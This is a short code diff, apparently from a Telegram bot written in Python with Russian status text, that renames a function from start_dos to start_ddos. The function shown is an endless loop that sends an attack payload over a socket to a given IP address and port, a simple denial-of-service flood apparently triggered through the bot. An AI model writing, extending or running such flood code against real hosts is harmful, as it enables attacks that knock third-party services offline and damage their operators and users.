@@ -28,6 +28,6 @@ async def get_ping(message: Message, dos_data: FSMContextProxy):
                             f"Количество обновлений: {i}")
 
 
-def start_dos(connect, ip: str, port: int, attack: bytes):
+def start_ddos(connect, ip: str, port: int, attack: bytes):
     while True:
         connect.sendto(attack, (ip, port))
